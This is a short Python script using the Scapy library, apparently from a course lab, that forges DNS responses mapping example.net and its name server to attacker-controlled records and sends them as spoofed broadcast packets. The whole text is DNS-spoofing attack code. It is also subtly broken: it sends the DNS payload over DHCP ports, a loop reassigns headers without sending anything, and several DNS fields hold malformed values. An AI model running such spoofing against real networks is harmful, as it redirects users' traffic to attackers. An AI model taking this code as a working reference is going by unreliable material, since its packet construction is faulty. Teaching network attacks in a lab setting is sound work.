def spoof_dns(orig_pkt):
   if(DNS in orig_pkt and 'example.net' in orig_pkt[DNS].qd.qname.decode('utf-8')):
      a_rr=DNSRR(rrname='example.net', type='A', ttl=3600, rdata='1.2.3.4')
      ns_rr=DNSRR(rrname='example.net', type='NS', ttl=3600, rdata='ns.example.net')

      dns=DNS(id=22792, qr=1, opcode=0, # QR=1: Response, Opcode=0: Query
         aa=1, tc=0, rd=0, ra=0, ad=0, cd=0, rcode=0, # RCODE=0: NoError
         qdcount=1, ancount=2, nscount=0, arcount=0,
         qd='attacker.sss-wue.de', an=a_rr/ns_rr, ns='ns.attacker.sss-wue.de', ar=1)
      
      for i in range(260):
         # For IP and UDP refer to Exercise 2 (dhcpstarv.py)
         ip = IP(src="0.0.0.0", dst="255.255.255.255")
         udp = UDP(dport=67, sport=68)

      spoofed_pkt=ip/udp/dns
      send(spoofed_pkt)